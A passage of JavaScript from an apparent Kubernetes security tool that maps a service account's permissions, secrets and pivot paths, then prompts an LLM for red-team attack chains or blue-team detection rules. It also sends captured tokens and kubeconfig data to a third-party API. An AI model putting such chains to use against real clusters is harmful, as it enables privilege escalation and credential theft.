      cmGetNs.add(tgt.namespace || '');
  });

  // Workload-mounted secrets/CMs are readable via pod filesystem
  ownWorkloadIdSet.forEach(wlId => {
    edges.filter(e => edgeNodeId(e.source || e.from) === wlId && e.kind === 'mounts')
      .forEach(e => {
        const tgt = nodeById[edgeNodeId(e.target || e.to)];
        if (tgt?.kind === 'Secret')    secretGetNs.add(tgt.namespace || '');
        if (tgt?.kind === 'ConfigMap') cmGetNs.add(tgt.namespace || '');
      });
  });

  // ── Filter secrets/CMs to only those this SA can actually access ──────────
  const secretsMeta = rawGraphData?.cluster_objects?.secrets_meta || [];
  const hasClusterSecretAccess = secretGetNs.has(''); // '' = cluster-wide
  const accessibleSecrets = secretsMeta.filter(sm =>
    hasClusterSecretAccess || secretGetNs.has(sm.namespace || '')
  );
  const capturedSecrets = accessibleSecrets.filter(sm =>
    sm.values && Object.keys(sm.values).length > 0
  );

  const cmMeta = rawGraphData?.cluster_objects?.configmaps_meta || [];
  const hasClusterCMAccess = cmGetNs.has('');
  const accessibleCMs = cmMeta.filter(cm =>
    hasClusterCMAccess || cmGetNs.has(cm.namespace || '')
  );
  const capturedCMs = accessibleCMs.filter(cm =>
    cm.data && Object.keys(cm.data).length > 0
  );

  const accessibleSecretsLines = accessibleSecrets.map(sm => {
    const hasCap = sm.values && Object.keys(sm.values).length > 0;
    const isToken = sm.type === 'kubernetes.io/service-account-token';
    return `  ${sm.namespace}/${sm.name}  type=${sm.type}${isToken?' [SA_TOKEN]':''}${hasCap?' [VALUES_CAPTURED]':''}  keys=[${(sm.data_keys||[]).join(',')}]`;
  });

  // ── Escalation verb capabilities ──────────────────────────────────────────
  const escalationCaps = {
    can_escalate_clusterroles: saEdges.some(e => e.kind === 'can_escalate'),
    can_bind_clusterroles:     saEdges.some(e => e.kind === 'can_bind'),
    can_create_crb:            saEdges.some(e => e.kind === 'can_create' &&
      (nodeById[edgeNodeId(e.target||e.to)]?.name||'').includes('clusterrolebinding')),
    can_patch_clusterroles:    saEdges.some(e => e.kind === 'can_patch' &&
      (nodeById[edgeNodeId(e.target||e.to)]?.name||'').includes('clusterrole')),
  };

  // ── Attack surface + track reachable SAs ─────────────────────────────────
  const compromiseKinds = new Set(['can_exec', 'can_patch', 'can_create', 'can_delete']);
  const attackSurface = [];
  const reachableSAIds = new Set();

  saEdges.forEach(e => {
    if (!compromiseKinds.has(e.kind)) return;
    const targetId = edgeNodeId(e.target || e.to);
    const target = nodeById[targetId];
    if (!target) return;

    const runsAsEdge = edges.find(e2 =>
      edgeNodeId(e2.source || e2.from) === targetId && e2.kind === 'runs_as'
    );
    const currentSA = runsAsEdge ? nodeById[edgeNodeId(runsAsEdge.target || runsAsEdge.to)] : null;
    if (currentSA && currentSA.id !== saId) reachableSAIds.add(currentSA.id);

    const entry = {
      verb: e.kind,
      target: `${target.kind}/${target.name} (ns: ${target.namespace||'?'})`,
      current_sa: null,
      current_sa_id: currentSA?.id || null,
      current_sa_risk: 0,
      current_sa_caps: [],
      current_sa_rules: [],
      adoptable_sas: [],
    };

    if (currentSA && currentSA.id !== saId) {
      entry.current_sa       = `${currentSA.namespace||'?'}/${currentSA.name}`;
      entry.current_sa_risk  = currentSA.risk_score || 0;
      entry.current_sa_rules = getSARules(currentSA.id);
      entry.current_sa_caps  = getSACaps(currentSA.id);
    }

    // Other SAs in same namespace adoptable via serviceAccountName swap
    if (target.namespace && (e.kind === 'can_patch' || e.kind === 'can_create')) {
      nodes
        .filter(n => n.kind === 'ServiceAccount' && n.namespace === target.namespace &&
                     n.id !== saId && n.id !== currentSA?.id)
        .sort((a, b) => (b.risk_score||0) - (a.risk_score||0))
        .slice(0, 4)
        .forEach(otherSA => {
          reachableSAIds.add(otherSA.id);
          const otherRules = getSARules(otherSA.id).slice(0, 4);
          const otherCaps  = getSACaps(otherSA.id).slice(0, 5);
          if (otherCaps.length > 0 || otherRules.length > 0) {
            entry.adoptable_sas.push({
              sa: `${otherSA.namespace}/${otherSA.name}`,
              risk: otherSA.risk_score || 0,
              rules: otherRules,
              caps: otherCaps,
            });
          }
        });
    }

    attackSurface.push(entry);
  });

  // ── Reachable pivot targets: ONLY SAs reachable via attack surface ─────────
  // Never show all cluster SAs — that causes hallucinated multi-hop paths.
  const reachablePivotTargets = nodes
    .filter(n => (n.kind === 'ServiceAccount' || n.kind === 'Identity') && reachableSAIds.has(n.id))
    .map(saNode => {
      const rules = getSARules(saNode.id);
      const caps  = getSACaps(saNode.id);
      const workloads = edges
        .filter(e => e.kind === 'runs_as' && edgeNodeId(e.target || e.to) === saNode.id)
        .map(e => { const wl = nodeById[edgeNodeId(e.source || e.from)]; return `${wl?.kind||'?'}/${wl?.name||'?'}`; });
      if (!rules.length && !caps.length) return null;
      return {
        name: `${saNode.namespace ? saNode.namespace+'/' : ''}${saNode.name||saNode.id}`,
        risk_score: saNode.risk_score || 0,
        rules: rules.slice(0, 6),
        caps:  caps.slice(0, 6),
        workloads,
      };
    })
    .filter(Boolean)
    .sort((a, b) => b.risk_score - a.risk_score);

  // ── Related findings ───────────────────────────────────────────────────────
  const relatedFindings = (findings || [])
    .filter(f => (f.affected_nodes||[]).some(nid =>
      nid === saId || saEdges.some(e => edgeNodeId(e.target || e.to) === nid)
    ))
    .slice(0, 10);

  const pivotChains = attackSurface.filter(a => a.current_sa);

  return {
    sa, ownRoleLines, directCaps, ownWorkloadLines,
    accessibleSecretsLines, capturedSecrets, capturedCMs,
    escalationCaps, attackSurface, reachablePivotTargets,
    relatedFindings, pivotChains,
  };
}

async function generateAIChain(saId) {
  const apiKey = document.getElementById('god-ai-key').value.trim();
  const model  = document.getElementById('god-ai-model').value;
  const status = document.getElementById('god-ai-status');
  const genBtn = document.getElementById('god-ai-generate');

  if (!apiKey) { setAIStatus('Enter API key', '#ff9f9f'); return; }
  if (saId === '__all__') { setAIStatus('Select a specific SA', '#ffd166'); return; }

  const data = buildAIPromptData(saId);
  if (!data) { setAIStatus('SA not found', '#ff9f9f'); return; }

  genBtn.disabled = true;
  setAIStatus('<span class="ai-spinner"></span>Thinking…', '#a29bfe', true);

  // Remove any existing AI block
  const body = document.getElementById('god-body');
  const existing = body.querySelector('.god-ai-block');
  if (existing) existing.remove();

  // Insert loading placeholder
  const placeholder = document.createElement('div');
  placeholder.className = 'god-ai-block expanded';
  placeholder.innerHTML = `
    <div class="god-ai-block-header">
      <span class="god-ai-badge">AI</span>
      <div class="god-ai-title">Generating attack chain for ${escHtml(data.sa.name||saId)}…</div>
    </div>
    <div class="god-ai-block-body">
      <div class="god-ai-loading"><span class="ai-spinner"></span>Sending graph data to ${escHtml(model)}…<br><span style="font-size:10px;color:var(--muted);margin-top:6px;display:block">This may take 10–30 seconds</span></div>
    </div>`;
  body.insertBefore(placeholder, body.firstChild);

  const systemPrompt = blueTeamMode
    ? `You are a Kubernetes blue team detection engineer. Given the attack surface data for a service account, generate detection rules. For each significant capability, output Falco rule snippets and Kubernetes audit policy entries that would detect exploitation.

Respond with valid JSON only:
{
  "chain_title": "Detection Rules for <SA>",
  "severity": "HIGH",
  "chain_type": "DETECTION",
  "summary": "...",
  "steps": [
    {"phase":"DETECT","action":"<action being detected>","desc":"<what to detect>","cmd":"# Falco rule:\\n- rule: ...\\n  condition: ...\\n  output: ..."}
  ],
  "detection_notes": ["Audit policy: log Verb=exec on pods/exec","..."]
}`
    : `You are a Kubernetes red team expert conducting an authorized security assessment. You analyze real cluster permission data and generate specific, technically accurate attack chains.

Rules:
- BOUND RBAC RULES is the primary permission source — reason from verbs+resources there first.
- DIRECT CAPABILITIES shows SSAR-confirmed checks and may be a subset of actual permissions.
- Use ONLY resources, SAs, and secrets explicitly listed in the data. Never invent names.
- If CAPTURED SECRET VALUES is empty the SA cannot read secret content — do not reference values.
- If REACHABLE PIVOT TARGETS is empty there are no reachable pivot SAs — do not invent multi-hop chains.
- Multi-hop chains require concrete workloads in ATTACK SURFACE that this SA can exec/patch/create.
- Set chain_type=LIMITED only when BOUND RBAC RULES, DIRECT CAPABILITIES, and ATTACK SURFACE are ALL empty or show zero actionable permissions.`;

  const { sa, ownRoleLines, directCaps, ownWorkloadLines,
          accessibleSecretsLines, capturedSecrets, capturedCMs,
          escalationCaps, attackSurface, reachablePivotTargets,
          relatedFindings, pivotChains } = data;

  // Format attack surface
  const attackSurfaceLines = attackSurface.map(a => {
    const lines = [`  ${a.verb} → ${a.target}`];
    if (a.current_sa) {
      lines.push(`    Runs as SA: ${a.current_sa} (risk: ${a.current_sa_risk}/10)`);
      if (a.current_sa_rules.length) lines.push(`      SA rules: ${a.current_sa_rules.join(' | ')}`);
      if (a.current_sa_caps.length)  lines.push(`      SA caps:  ${a.current_sa_caps.join(', ')}`);
    }
    if (a.adoptable_sas.length) {
      lines.push(`    Via serviceAccountName swap, can adopt any SA in same namespace:`);
      a.adoptable_sas.forEach(s => {
        lines.push(`      → ${s.sa} (risk: ${s.risk}/10)`);
        if (s.rules.length) lines.push(`        rules: ${s.rules.join(' | ')}`);
        if (s.caps.length)  lines.push(`        caps:  ${s.caps.join(', ')}`);
      });
    }
    return lines.join('\n');
  }).join('\n');

  // Format reachable pivot targets
  const pivotTargetLines = reachablePivotTargets.map(s => {
    const lines = [`  ${s.name} (risk: ${s.risk_score}/10)`];
    if (s.rules.length)     lines.push(`    rules: ${s.rules.join(' | ')}`);
    if (s.caps.length)      lines.push(`    caps:  ${s.caps.join(', ')}`);
    if (s.workloads.length) lines.push(`    workloads: ${s.workloads.join(', ')}`);
    return lines.join('\n');
  }).join('\n');

  // Format captured secrets
  const capturedSecretLines = capturedSecrets.map(sm => {
    const isToken = sm.type === 'kubernetes.io/service-account-token' ||
      Object.keys(sm.values||{}).includes('token');
    const entries = Object.entries(sm.values||{}).map(([k, v]) => {
      const s = String(v);
      return `    ${k}: ${s.length > 350 ? s.slice(0, 350) + '...(truncated)' : s}`;
    }).join('\n');
    return `  ${sm.namespace}/${sm.name}  (type=${sm.type})${isToken ? '  ← SERVICE ACCOUNT TOKEN' : ''}:\n${entries}`;
  }).join('\n\n');

  // Format captured configmap data
  const capturedCMLines = capturedCMs.map(cm => {
    const entries = Object.entries(cm.data||{}).map(([k, v]) => {
      const s = String(v);
      const isKube = s.includes('apiVersion: v1') && s.includes('clusters:');
      return `    ${k}${isKube ? '  ← KUBECONFIG FILE' : ''}:\n      ${s.length > 450 ? s.slice(0, 450) + '...(truncated)' : s}`;
    }).join('\n');
    return `  ${cm.namespace}/${cm.name}:\n${entries}`;
  }).join('\n\n');

  const userPrompt = `Authorized k8scout security assessment.

## TARGET SA: ${sa.name||'?'} / namespace: ${sa.namespace||'default'} / risk: ${sa.risk_score||0}/10

### BOUND RBAC RULES (actual policy rules from role bindings)
${ownRoleLines.length ? ownRoleLines.join('\n') : '  (none — no role bindings found for this SA)'}

### DIRECT CAPABILITIES (confirmed via SSAR/SSRR graph edges)
${directCaps.length ? directCaps.join('\n') : '  (none — this SA has no confirmed permissions)'}
[VALUES_CAPTURED] = SA confirmed GET access; secret data is in CAPTURED SECRET VALUES below
[DATA_CAPTURED]   = SA confirmed GET access; configmap data is in CAPTURED CONFIGMAP DATA below

### WORKLOADS RUNNING AS THIS SA
${ownWorkloadLines.length ? ownWorkloadLines.join('\n') : '  (none)'}

### SECRETS THIS SA CAN ACCESS (only namespaces where get/list is confirmed or secret is mounted)
${accessibleSecretsLines.length ? accessibleSecretsLines.join('\n') : '  (none — no get/list on secrets confirmed in any namespace)'}

### CAPTURED SECRET VALUES (SA has confirmed GET; this data is already in attacker possession)
${capturedSecrets.length ? capturedSecretLines : '  (none)'}

### CAPTURED CONFIGMAP DATA (SA has confirmed GET; this data is already in attacker possession)
${capturedCMs.length ? capturedCMLines : '  (none)'}

### ESCALATION VERB CAPABILITIES
can_escalate on clusterroles:    ${escalationCaps.can_escalate_clusterroles}
can_bind on clusterroles:        ${escalationCaps.can_bind_clusterroles}
can_create clusterrolebindings:  ${escalationCaps.can_create_crb}
can_patch clusterroles:          ${escalationCaps.can_patch_clusterroles}

### ATTACK SURFACE — WORKLOADS THIS SA CAN EXEC/PATCH/CREATE/DELETE
(These are the ONLY reachable pivot points. Each shows the workload, its current SA, and other SAs adoptable via serviceAccountName swap in the same namespace.)
${attackSurface.length ? attackSurfaceLines : '  (none — this SA cannot exec, patch, create, or delete any workloads)'}

### REACHABLE PIVOT TARGETS (SAs reachable ONLY through the attack surface above)
${reachablePivotTargets.length ? pivotTargetLines : '  (none — no SAs reachable from this SA)'}

### AUTOMATED RISK FINDINGS
${relatedFindings.length ? relatedFindings.map(f => `  [${f.severity||'?'}] ${f.rule_id||'?'}: ${(f.title||f.description||'').slice(0,120)}`).join('\n') : '  (none)'}

---
Generate the most dangerous attack chain starting from ${sa.name||'?'}.
- Reason primarily from BOUND RBAC RULES — derive what this SA can do from the verbs and resources listed there, even if DIRECT CAPABILITIES is sparse.
- Only reference secrets, SAs, and workloads explicitly listed above. Do not invent names.
- For multi-hop chains, identity_at_step MUST change between steps and each pivot SA MUST appear in REACHABLE PIVOT TARGETS above.
- Set chain_type=LIMITED ONLY when both BOUND RBAC RULES and DIRECT CAPABILITIES are completely empty or show no actionable verbs on any resources.

Return ONLY valid JSON:
{
  "chain_title": "Specific title naming the SAs and final impact (max 80 chars)",
  "summary": "3-5 sentences describing the exact path, which RBAC rules enable each step, which SAs are pivoted through, and the final blast radius",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "chain_type": "MULTI_HOP_PIVOT|DIRECT_PRIVESC|LATERAL_MOVE|SECRET_EXFIL|LIMITED",
  "pivot_identities": ["ns/sa-name for each SA pivoted through, empty if no pivot"],
  "steps": [
    {
      "phase": "Initial Access|Execution|Privilege Escalation|Lateral Movement|Credential Access|Exfiltration",
      "action": "Action title (max 70 chars)",
      "desc": "What happens, which specific RBAC rule enables it, what is gained",
      "cmd": "kubectl/curl command using exact resource names from the data",
      "identity_at_step": "ns/sa-name of the active identity at this step"
    }
  ],
  "escalation_chains": [
    {"title": "...", "severity": "CRITICAL|HIGH|MEDIUM|LOW", "hops": ["step1", "step2", "...final impact"], "final_impact": "..."}
  ],
  "detection_notes": ["audit log event: verb=X resource=Y user=Z namespace=W → what it indicates"]
}
5-10 steps for exploitable chains. 2-3 steps for LIMITED. escalation_chains may be empty array.`;

  try {
    const provider = getActiveProvider();
    const { endpoint, headers, body } = buildAIFetchOptions(apiKey, model, [
      { role: 'system', content: systemPrompt },
      { role: 'user',   content: userPrompt },
    ]);

    const resp = await fetch(endpoint, { method: 'POST', headers, body: JSON.stringify(body) });

    if (!resp.ok) {
      const err = await resp.json().catch(() => ({}));
      const msg = err?.error?.message || `HTTP ${resp.status}`;
      throw new Error(msg);
    }

    const json = await resp.json();
    const raw  = json.choices?.[0]?.message?.content || '';

    // Some models wrap JSON in markdown fences — strip them
    const cleaned = raw.replace(/^```(?:json)?\s*/i, '').replace(/\s*```$/i, '').trim();
    const chain = JSON.parse(cleaned);

    if (!chain.steps || !Array.isArray(chain.steps)) throw new Error('Invalid response format from AI');

    // Save key on success for this provider
    localStorage.setItem(PROVIDER_KEY_STORAGE[provider], apiKey);

    placeholder.remove();
    renderAIChainBlock(chain, data.sa, model, data.pivotChains.length);
    const altCount = (chain.escalation_chains||[]).length;
    const ct = (chain.chain_type || '').toUpperCase();
    const pivotTag = ct === 'MULTI_HOP_PIVOT' ? ' ⛓ CHAIN'
      : ct === 'ESCALATE_BIND' ? ' ★ BIND'
      : ct === 'KUBECONFIG_THEFT' ? ' ⚡ KUBE'
      : ct === 'SECRET_EXFIL' ? ' ⬇ EXFIL'
      : '';
    setAIStatus(`✓ ${chain.steps.length} steps${altCount ? ' +'+altCount+' alt' : ''}${pivotTag}`, '#06d6a0');
  } catch (err) {
    placeholder.querySelector('.god-ai-block-body').innerHTML =
      `<div class="god-ai-error">⚠ ${escHtml(err.message)}</div>`;
    setAIStatus('Error — see chain', '#ff9f9f');
  } finally {
    genBtn.disabled = false;
  }
}

function setAIStatus(html, color, isHtml) {
  const el = document.getElementById('god-ai-status');
  el.style.color = color || 'var(--muted)';
  if (isHtml) el.innerHTML = html;
  else el.textContent = html;
}

function openAnalyzerPathInExplore(path) {
  if (!path) return;
  const idx = Math.max(computedPaths.indexOf(path), 0);
  const pathId = ensurePathId(path, idx);
  route(`/explore?scope=path:${encodeURIComponent(pathId)}&path=${encodeURIComponent(pathId)}`);
}

window.openAnalyzerPathInExplore = function() {
  openAnalyzerPathInExplore(window._k8s_miniPath);
};

function renderAttackPathMiniGraph(saNode, containerEl) {
  const saId = saNode?.id;
  if (!saId || !graphData) return;

  // ── helpers ──────────────────────────────────────────────────────────────
  function isMiniTarget(n) {
    if (!n) return false;
    if (n.kind === 'ClusterRole' || n.kind === 'ClusterRoleBinding' || n.kind === 'Node' || n.kind === 'Secret') return true;
    if ((n.risk_score || 0) >= 6) return true;
    const id = n.id || '';
    return id.includes('secrets') || id.includes('clusterrole') || id.includes('pods/exec');
  }

  // ── collect up to 3 distinct paths (different end targets) ───────────────
  const candidatePaths = [];

  // 1. Pre-computed paths starting directly from SA
  (computedPaths || [])
    .filter(p => p.nodes[0] === saId)
    .sort((a, b) => pathImpactType(b).score - pathImpactType(a).score)
    .forEach(p => candidatePaths.push(p));

  // 2. Pre-computed paths containing SA (trim to SA start)
  (computedPaths || [])
    .filter(p => p.nodes.includes(saId) && p.nodes[0] !== saId)
    .sort((a, b) => pathImpactType(b).score - pathImpactType(a).score)
    .forEach(p => {
      const idx = p.nodes.indexOf(saId);
      const trimmed = { nodes: p.nodes.slice(idx), edges: p.edges.slice(idx) };
      if (trimmed.nodes.length >= 2) candidatePaths.push(trimmed);
    });

  // 3. BFS from SA if still no paths at all
  if (!candidatePaths.length) {
    const adj = {};
    graphData.edges.forEach(e => {
      const s = edgeNodeId(e.source || e.from), t = edgeNodeId(e.target || e.to);
      if (!s || !t || !ATTACK_EDGE_KINDS.has(e.kind)) return;
      if (!adj[s]) adj[s] = [];
      adj[s].push({ to: t, kind: e.kind });
    });
    const found = [];
    const queue = [{ nodes: [saId], edges: [], visited: new Set([saId]) }];
    while (queue.length && found.length < 6) {
      const cur = queue.shift();
      const last = cur.nodes[cur.nodes.length - 1];
      if (cur.nodes.length > 1 && isMiniTarget(nodeById[last])) { found.push(cur); continue; }
      if (cur.nodes.length >= 8) continue;
      for (const step of (adj[last] || [])) {
        if (!cur.visited.has(step.to)) {
          queue.push({ nodes: [...cur.nodes, step.to], edges: [...cur.edges, step.kind], visited: new Set([...cur.visited, step.to]) });
        }
      }
    }
    found.forEach(p => candidatePaths.push(p));
  }

  if (!candidatePaths.length) return;

  // Deduplicate: keep only one path per unique end-target, pick highest score
  const byTarget = {};
  candidatePaths.forEach(p => {
    const target = p.nodes[p.nodes.length - 1];
    if (!byTarget[target] || pathImpactType(p).score > pathImpactType(byTarget[target]).score) {
      byTarget[target] = p;
    }
  });
  const paths = Object.values(byTarget)
    .sort((a, b) => pathImpactType(b).score - pathImpactType(a).score)
    .slice(0, 3);

  // ── layout constants ─────────────────────────────────────────────────────
  const NS      = 'http://www.w3.org/2000/svg';
  const nodeR   = 18;
  const spacing = 108;
  const labelW  = 68;   // left lane-label column
  const padX    = 26;
  const laneH   = 108;  // vertical space per lane
  const topPad  = 12;

  const maxNodes = Math.max(...paths.map(p => p.nodes.length));
  const W = labelW + padX * 2 + spacing * (maxNodes - 1);
  const H = topPad + paths.length * laneH + 8;

  const sevColors = { CRITICAL:'#ff4757', HIGH:'#ff9f43', MEDIUM:'#ffd166', LOW:'#06d6a0' };
  const sevBgs    = { CRITICAL:'rgba(56,9,9,.9)', HIGH:'rgba(54,21,0,.9)', MEDIUM:'rgba(44,34,0,.9)', LOW:'rgba(0,32,24,.9)' };

  // ── wrapper & header ─────────────────────────────────────────────────────
  const wrap = document.createElement('div');
  wrap.className = 'path-mini-graph-wrap';

  const bestPath   = paths[0];
  const bestImpact = pathImpactType(bestPath);
  const bestSev    = pathSeverity(bestPath);
  window._k8s_miniPath = bestPath;

  const header = document.createElement('div');
  header.className = 'path-mini-graph-header';
  header.innerHTML = `
    <span style="width:7px;height:7px;border-radius:50%;background:var(--path-glow);flex-shrink:0;box-shadow:0 0 8px var(--path-glow)"></span>
    Attack Path Graph
    <span style="font-size:9px;padding:1px 7px;border-radius:4px;background:${sevBgs[bestSev]||'#111'};color:${sevColors[bestSev]||'#fff'};border:1px solid ${sevColors[bestSev]||'#fff'}60">${bestImpact.label}</span>
    <span style="margin-left:auto;font-size:10px;color:var(--muted);font-weight:400">${paths.length} chain${paths.length > 1 ? 's' : ''}</span>
    <button style="background:none;border:1px solid rgba(169,227,75,.3);color:var(--path-glow);border-radius:5px;padding:2px 9px;font-size:10px;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all .2s;"
      onmouseenter="this.style.background='rgba(169,227,75,.08)'"
      onmouseleave="this.style.background='none'"
      onclick="
        window.openAnalyzerPathInExplore && window.openAnalyzerPathInExplore();
      ">↗ View in graph</button>`;

  // ── SVG ──────────────────────────────────────────────────────────────────
  const svgWrap = document.createElement('div');
  svgWrap.className = 'path-mini-graph-svg-wrap';

  const svg = document.createElementNS(NS, 'svg');
  svg.setAttribute('width', W);
  svg.setAttribute('height', H);
  svg.style.cssText = 'display:block;margin:0 auto;';

  // Arrow markers — one per severity colour + default
  const defs = document.createElementNS(NS, 'defs');
  [
    ['mg-arr-default', 'rgba(169,227,75,.65)'],
    ['mg-arr-crit',    'rgba(255,71,87,.65)'],
    ['mg-arr-high',    'rgba(255,159,67,.65)'],
    ['mg-arr-med',     'rgba(255,209,102,.65)'],
    ['mg-arr-low',     'rgba(6,214,160,.65)'],
  ].forEach(([id, fill]) => {
    const mk = document.createElementNS(NS, 'marker');
    mk.setAttribute('id', id);
    mk.setAttribute('viewBox', '0 -4 8 8');
    mk.setAttribute('refX', '7'); mk.setAttribute('refY', '0');
    mk.setAttribute('markerWidth', '5'); mk.setAttribute('markerHeight', '5');
    mk.setAttribute('orient', 'auto');
    const ap = document.createElementNS(NS, 'path');
    ap.setAttribute('d', 'M0,-4L8,0L0,4');
    ap.setAttribute('fill', fill);
    mk.appendChild(ap); defs.appendChild(mk);
  });
  svg.appendChild(defs);

  // Track node positions across lanes for shared-node connectors
  // nodeId → [{laneIdx, x, cy}]
  const nodePositions = {};

  const laneColors = {
    CRITICAL: { edge:'rgba(255,71,87,.55)', dash:'rgba(255,71,87,.85)', arr:'mg-arr-crit',  label:'var(--crit)' },
    HIGH:     { edge:'rgba(255,159,67,.5)', dash:'rgba(255,159,67,.8)', arr:'mg-arr-high', label:'var(--high)' },
    MEDIUM:   { edge:'rgba(255,209,102,.4)',dash:'rgba(255,209,102,.7)',arr:'mg-arr-med',  label:'var(--med)'  },
    LOW:      { edge:'rgba(6,214,160,.4)',  dash:'rgba(6,214,160,.7)', arr:'mg-arr-low',  label:'var(--low)'  },
  };

  // ── draw each lane ────────────────────────────────────────────────────────
  paths.forEach((path, laneIdx) => {
    const pNodes = path.nodes.map(id => nodeById[id]).filter(Boolean);
    if (pNodes.length < 2) return;

    const sev   = pathSeverity(path);
    const lc    = laneColors[sev] || laneColors.LOW;
    const cy    = topPad + laneIdx * laneH + 46;
    const xBase = labelW + padX;

    // ── lane divider (except first) ─────────────────────────────────────
    if (laneIdx > 0) {
      const div = document.createElementNS(NS, 'line');
      div.setAttribute('x1', labelW); div.setAttribute('x2', W);
      div.setAttribute('y1', topPad + laneIdx * laneH - 2);
      div.setAttribute('y2', topPad + laneIdx * laneH - 2);
      div.setAttribute('stroke', 'rgba(255,255,255,.06)');
      div.setAttribute('stroke-width', '1');
      svg.appendChild(div);
    }

    // ── lane label (left column) ─────────────────────────────────────────
    const impact = pathImpactType(path);

    const sevBadge = document.createElementNS(NS, 'rect');
    sevBadge.setAttribute('x', '4'); sevBadge.setAttribute('y', cy - 10);
    sevBadge.setAttribute('width', labelW - 8); sevBadge.setAttribute('height', '13');
    sevBadge.setAttribute('rx', '3');
    sevBadge.setAttribute('fill', sevBgs[sev] || '#111');
    svg.appendChild(sevBadge);

    const sevTxt = document.createElementNS(NS, 'text');
    sevTxt.setAttribute('x', labelW / 2 - 2); sevTxt.setAttribute('y', cy - 1);
    sevTxt.setAttribute('text-anchor', 'middle');
    sevTxt.setAttribute('font-size', '8'); sevTxt.setAttribute('font-weight', '700');
    sevTxt.setAttribute('fill', sevColors[sev] || '#aaa');
    sevTxt.setAttribute('font-family', 'system-ui,sans-serif');
    sevTxt.textContent = sev;
    svg.appendChild(sevTxt);

    const impTxt = document.createElementNS(NS, 'text');
    impTxt.setAttribute('x', labelW / 2 - 2); impTxt.setAttribute('y', cy + 10);
    impTxt.setAttribute('text-anchor', 'middle');
    impTxt.setAttribute('font-size', '7'); impTxt.setAttribute('fill', 'rgba(255,255,255,.4)');
    impTxt.setAttribute('font-family', 'system-ui,sans-serif');
    // Two-word wrap via tspan
    const words = impact.label.split(' ');
    if (words.length <= 2) {
      impTxt.textContent = impact.label;
    } else {
      const ts1 = document.createElementNS(NS, 'tspan');
      ts1.setAttribute('x', labelW / 2 - 2); ts1.setAttribute('dy', '0');
      ts1.textContent = words.slice(0, 2).join(' ');
      const ts2 = document.createElementNS(NS, 'tspan');
      ts2.setAttribute('x', labelW / 2 - 2); ts2.setAttribute('dy', '9');
      ts2.textContent = words.slice(2).join(' ');
      impTxt.appendChild(ts1); impTxt.appendChild(ts2);
    }
    svg.appendChild(impTxt);

    // Chain index badge (top-left of label)
    const idxTxt = document.createElementNS(NS, 'text');
    idxTxt.setAttribute('x', '8'); idxTxt.setAttribute('y', cy - 16);
    idxTxt.setAttribute('font-size', '8'); idxTxt.setAttribute('fill', lc.label);
    idxTxt.setAttribute('font-weight', '700'); idxTxt.setAttribute('font-family', 'system-ui,sans-serif');
    idxTxt.textContent = laneIdx === 0 ? '● PRIMARY' : `◦ ALT ${laneIdx}`;
    svg.appendChild(idxTxt);

    // Separator line between label and graph area
    const sep = document.createElementNS(NS, 'line');
    sep.setAttribute('x1', labelW); sep.setAttribute('x2', labelW);
    sep.setAttribute('y1', cy - 26); sep.setAttribute('y2', cy + 38);
    sep.setAttribute('stroke', 'rgba(255,255,255,.07)');
    sep.setAttribute('stroke-width', '1');
    svg.appendChild(sep);

    // Node x positions
    pNodes.forEach((n, i) => { n._lx = xBase + i * spacing; });

    // ── edges ─────────────────────────────────────────────────────────────
    path.edges.forEach((ek, i) => {
      const s = pNodes[i], t = pNodes[i + 1];
      if (!s || !t) return;
      const x1 = s._lx + nodeR, x2 = t._lx - nodeR - 6;
      const mx  = (x1 + x2) / 2, my = cy - 28;
      const d   = `M${x1},${cy} Q${mx},${my} ${x2},${cy}`;

      const base = document.createElementNS(NS, 'path');
      base.setAttribute('d', d); base.setAttribute('fill', 'none');
      base.setAttribute('stroke', lc.edge); base.setAttribute('stroke-width', '1.5');
      base.setAttribute('marker-end', `url(#${lc.arr})`);
      svg.appendChild(base);

      const anim = document.createElementNS(NS, 'path');
      anim.setAttribute('d', d); anim.setAttribute('fill', 'none');
      anim.setAttribute('stroke', lc.dash); anim.setAttribute('stroke-width', '1.5');
      anim.setAttribute('stroke-dasharray', '5 8');
      anim.style.animation = `miniDash ${1.2 + laneIdx * 0.15}s linear infinite ${(i * 0.2).toFixed(2)}s`;
      svg.appendChild(anim);

      const lbl = document.createElementNS(NS, 'text');
      lbl.setAttribute('x', mx); lbl.setAttribute('y', my - 4);
      lbl.setAttribute('text-anchor', 'middle'); lbl.setAttribute('font-size', '7');
      lbl.setAttribute('fill', 'rgba(162,155,254,.7)');
      lbl.setAttribute('font-family', 'system-ui,sans-serif');
      lbl.textContent = ek;
      svg.appendChild(lbl);
    });

    // ── nodes ─────────────────────────────────────────────────────────────
    pNodes.forEach((n, i) => {
      const isFirst = i === 0, isLast = i === pNodes.length - 1;
      const isPivotSA = !isFirst && (n.kind === 'ServiceAccount' || n.kind === 'Identity');
      const cat    = securityCategory(n);
      const fill   = CATEGORY_COLORS[cat] || DEFAULT_NODE_COLOR;
      const stroke = isFirst ? '#4cc9f0' : isLast ? sevColors[sev] || '#ff4757' : isPivotSA ? '#ff79c6' : lc.label;
      const sw     = (isFirst || isLast) ? 2.5 : isPivotSA ? 2 : 1.5;

      // Track position for cross-lane connectors
      if (!nodePositions[n.id]) nodePositions[n.id] = [];
      nodePositions[n.id].push({ laneIdx, x: n._lx, cy });

      const g = document.createElementNS(NS, 'g');
      g.setAttribute('transform', `translate(${n._lx},${cy})`);
      g.style.cursor = 'pointer';
      g.addEventListener('click', () => {
        if (currentRoute?.name !== 'explore' || !nodesLayer || !linksLayer) {
          openAnalyzerPathInExplore(window._k8s_miniPath);
          return;
        }
        closeIdentityAnalyzer();
        selectNode(n.id);
      });

      // Pulsing halo
      if (isFirst || isLast || isPivotSA) {
        const halo = document.createElementNS(NS, 'circle');
        halo.setAttribute('r', nodeR + 6);
        halo.setAttribute('fill', 'none');
        halo.setAttribute('stroke', stroke);
        halo.setAttribute('stroke-width', '1');
        halo.style.animation = `miniHalo 2s ease-in-out infinite ${(laneIdx * 0.4 + (isLast ? .6 : 0)).toFixed(1)}s`;
        g.appendChild(halo);
      }

      const circle = document.createElementNS(NS, 'circle');
      circle.setAttribute('r', nodeR);
      circle.setAttribute('fill', fill); circle.setAttribute('fill-opacity', '0.85');
      circle.setAttribute('stroke', stroke); circle.setAttribute('stroke-width', sw);
      g.appendChild(circle);

      // Pivot SA gets a small chain icon overlay
      if (isPivotSA) {
        const badge = document.createElementNS(NS, 'circle');
        badge.setAttribute('cx', nodeR - 5); badge.setAttribute('cy', -nodeR + 5);
        badge.setAttribute('r', '5'); badge.setAttribute('fill', '#2a0033');
